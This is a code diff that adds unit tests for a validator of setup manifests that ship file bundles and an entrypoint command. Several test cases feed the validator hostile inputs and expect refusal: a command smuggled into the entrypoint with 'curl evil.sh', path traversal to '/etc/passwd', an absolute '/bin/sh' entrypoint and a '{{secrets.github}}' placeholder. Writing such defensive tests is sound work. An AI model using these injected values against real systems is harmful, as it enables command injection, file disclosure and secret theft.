@@ -1,10 +1,24 @@
 import { describe, expect, it } from "vitest";
 import { validateSetupEntry } from "#/manifests/manifest-validation";
+import type { SetupForm } from "#/manifests/types";
 import {
   createSetup,
   createSetupEntry,
   createSetupEntryWith,
 } from "./manifest-test-data";
+
+/**
+ * The published form with one field's declaration replaced wholesale, so a
+ * case can state a key the host's own types do not admit. Admission is a trust
+ * boundary over data from another repository, and that data is not typed.
+ */
+function formWithField(
+  name: string,
+  field: Record<string, unknown>,
+): SetupForm {
+  const { form } = createSetup();
+  return { ...form, args: { ...form.args, [name]: field } } as SetupForm;
+}
 
 describe("validateSetupEntry", () => {
   it("admits a well-formed manifest", () => {
@@ -192,6 +206,207 @@ describe("validateSetupEntry", () => {
 
     // Assert
     expect(result.valid).toBe(false);
+  });
+
+  const bundle = {
+    version: "1.0.0",
+    entrypoint: "python3 main.py",
+    files: { "main.py": "skills/widget-monitor/scripts/main.py" },
+    config: { repos: ["{{form.repository}}"] },
+  };
+
+  it("admits a direct entry that ships a bundle instead of a prompt", () => {
+    // Arrange
+    const entry = createSetupEntry({
+      setup: createSetup({ prompt: undefined, bundle }),
+    });
+
+    // Act
+    const result = validateSetupEntry(entry);
+
+    // Assert
+    expect(result).toEqual({ valid: true, errors: [] });
+  });
+
+  // A bundle is the one part of a manifest naming files and a command this
+  // host acts on, so each of these would be acted on if it were admitted.
+  it.each([
+    [
+      "a direct entry declaring both a prompt and a bundle",
+      { setup: createSetup({ bundle }) },
+    ],
+    [
+      "a direct entry declaring neither",
+      { setup: createSetup({ prompt: undefined }) },
+    ],
+    [
+      "an assisted entry carrying a bundle",
+      {
+        setup: createSetup({
+          mode: "assisted" as const,
+          prompt: undefined,
+          form: { args: createSetup().form.args },
+          message: "Set this up in a conversation.",
+          bundle,
+        }),
+      },
+    ],
+    [
+      "an entrypoint carrying a shell metacharacter",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, entrypoint: "python3 main.py && curl evil.sh" },
+        }),
+      },
+    ],
+    [
+      "a packed path that escapes the archive",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: {
+            ...bundle,
+            files: { "../main.py": "skills/widget-monitor/scripts/main.py" },
+          },
+        }),
+      },
+    ],
+    [
+      "a source outside skills/ and automations/",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, files: { "main.py": "../../etc/passwd" } },
+        }),
+      },
+    ],
+    [
+      "a config placeholder in an unknown namespace",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, config: { token: "{{secrets.github}}" } },
+        }),
+      },
+    ],
+    [
+      "a bundle version that is not a semantic version",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, version: "latest" },
+        }),
+      },
+    ],
+    [
+      "an entrypoint that climbs out of the archive",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, entrypoint: "python3 ../../etc/x.py" },
+        }),
+      },
+    ],
+    [
+      "an entrypoint naming an absolute path",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, entrypoint: "/bin/sh setup.sh" },
+        }),
+      },
+    ],
+    [
+      "an entrypoint of nothing but spaces",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, entrypoint: "   " },
+        }),
+      },
+    ],
+    [
+      "a packed path claiming the rendered config's own name",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: {
+            ...bundle,
+            files: {
+              ...bundle.files,
+              "config.json": "skills/widget-monitor/scripts/config.json",
+            },
+          },
+        }),
+      },
+    ],
+    [
+      "a setup script the bundle does not pack",
+      {
+        setup: createSetup({
+          prompt: undefined,
+          bundle: { ...bundle, setupScript: "not-packed.sh" },
+        }),
+      },
+    ],
+    [
+      "a multi-value declaration on a field that is not a repository picker",
+      {
+        setup: createSetup({
+          form: formWithField("widgetName", {
+            type: "text",
+            label: "Widget name",
+            help: "What to call it.",
+            required: true,
+            multiple: true,
+          }),
+        }),
+      },
+    ],
+    [
+      "a multi-value declaration that is not true",
+      {
+        setup: createSetup({
+          form: formWithField("repository", {
+            type: "repo-picker",
+            label: "Repository",
+            help: "Which repositories to watch.",
+            provider: "github",
+            required: true,
+            multiple: "banana",
+          }),
+        }),
+      },
+    ],
+  ])("refuses %s", (_case, overrides) => {
+    // Act
+    const result = validateSetupEntry(createSetupEntry(overrides));
+
+    // Assert
+    expect(result.valid).toBe(false);
+  });
+
+  it("admits a repository field that collects several repositories", () => {
+    // Arrange
+    const entry = createSetupEntry({
+      setup: createSetup({
+        form: formWithField("repository", {
+          type: "repo-picker",
+          label: "Repositories",
+          help: "Which repositories to watch.",
+          provider: "github",
+          required: true,
+          multiple: true,
+        }),
+      }),
+    });
+
+    // Act
+    const result = validateSetupEntry(entry);
+
+    // Assert
+    expect(result).toEqual({ valid: true, errors: [] });
   });
 
   it("reports every problem at once so an author sees the whole picture", () => {
